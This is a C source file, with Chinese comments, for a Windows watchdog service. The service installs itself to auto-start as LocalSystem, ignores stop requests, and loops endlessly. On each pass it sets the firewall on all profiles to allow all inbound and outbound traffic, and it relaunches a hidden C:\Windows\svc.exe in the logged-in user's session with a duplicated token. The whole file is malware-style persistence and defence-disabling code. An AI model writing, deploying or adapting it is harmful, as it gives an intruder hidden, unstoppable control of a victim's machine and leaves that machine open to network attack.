#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <wtsapi32.h>
#include <userenv.h>

#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "userenv.lib")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")   // 无控制台窗口

#define SERVICE_NAME L"svc"
#define MASTER_PATH L"C:\\Windows\\svc.exe"
#define WATCHDOG_PATH L"C:\\Windows\\watchdog.exe"
#define MASTER_EXE  L"svc.exe"
#define SIGNATURE   1145

SERVICE_STATUS_HANDLE g_hStatus = NULL;

int ProcessExists(const wchar_t *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    int found = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) { found = 1; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

void ConfigureFirewall() {
    WCHAR cmd[] = L"C:\\Windows\\System32\\netsh.exe advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound";
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

void CreateWatchdogService() {
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) return;

    SC_HANDLE hService = CreateServiceW(
        hSCM,
        SERVICE_NAME,               // 服务名 "svc"
        SERVICE_NAME,               // 显示名
        SERVICE_ALL_ACCESS,         // 请求的所有权限（实际只需要 CREATE_SERVICE）
        SERVICE_WIN32_OWN_PROCESS,  // 独立进程服务
        SERVICE_AUTO_START,         // 自动启动
        SERVICE_ERROR_NORMAL,       // 错误处理等级
        WATCHDOG_PATH,              // 可执行文件路径 C:\Windows\watchdog.exe
        NULL,                       // 不指定服务组
        NULL,                       // 不指定标签
        NULL,                       // 不依赖其他服务
        NULL,                       // 无账户名（使用 LocalSystem）
        NULL                        // 无密码
    );

    if (hService) CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
}

// StartMaster 函数简化（移除创建服务的部分，只保留启动 svc.exe）
void StartMaster() {
    DWORD sid = WTSGetActiveConsoleSessionId();
    if (sid == 0xFFFFFFFF) return;
    HANDLE hToken = NULL;
    if (!WTSQueryUserToken(sid, &hToken)) return;
    HANDLE hDup = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDup)) {
        CloseHandle(hToken);
        return;
    }
    CloseHandle(hToken);
    LPVOID pEnv = NULL;
    CreateEnvironmentBlock(&pEnv, hDup, FALSE);

    STARTUPINFOW si = { sizeof(si) };
    si.lpDesktop = L"winsta0\\default";
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    WCHAR cmd[512];
    wsprintfW(cmd, L"\"%s\" %s %d", MASTER_PATH, SERVICE_NAME, SIGNATURE);
    CreateProcessAsUserW(hDup, NULL, cmd, NULL, NULL, FALSE,
                         NORMAL_PRIORITY_CLASS | CREATE_UNICODE_ENVIRONMENT,
                         pEnv, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    DestroyEnvironmentBlock(pEnv);
    CloseHandle(hDup);
}

DWORD WINAPI HandlerEx(DWORD dwControl, DWORD, LPVOID, LPVOID) {
    switch (dwControl) {
        case SERVICE_CONTROL_STOP:
            // 不做任何处理，服务不可停止
            return NO_ERROR;
        case SERVICE_CONTROL_INTERROGATE:
            return NO_ERROR;
        default:
            return ERROR_CALL_NOT_IMPLEMENTED;
    }
}

// 删除原 WatchdogThread 函数（内容已移到 ServiceMain）

VOID WINAPI ServiceMain(DWORD argc, LPWSTR *argv) {
    // 注册控制处理器
    g_hStatus = RegisterServiceCtrlHandlerExW(SERVICE_NAME, HandlerEx, NULL);
    if (!g_hStatus) return;

    // 报告启动中
    SERVICE_STATUS ss = {
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_START_PENDING,
        0,
        NO_ERROR,
        0,
        0,
        3000
    };
    SetServiceStatus(g_hStatus, &ss);

    // 报告服务已运行（主线程即将进入无限循环，必须设置为 RUNNING）
    ss.dwCurrentState = SERVICE_RUNNING;
    ss.dwControlsAccepted = 0;      // 不接受任何控制（包括停止）
    ss.dwWaitHint = 0;
    SetServiceStatus(g_hStatus, &ss);

    // 主线程直接执行看门狗循环（原 WatchdogThread 的内容）
    while (1) {
        CreateWatchdogService();   // 每次循环都尝试创建服务
        ConfigureFirewall();
        if (!ProcessExists(MASTER_EXE)) {
            StartMaster();
        }
    }
    // 永远不会到达这里
}

// main 函数保持不变

int main() {
    SERVICE_TABLE_ENTRYW dispatchTable[] = {
        { (LPWSTR)SERVICE_NAME, ServiceMain },
        { NULL, NULL }
    };
    StartServiceCtrlDispatcherW(dispatchTable);
    return 0;
}
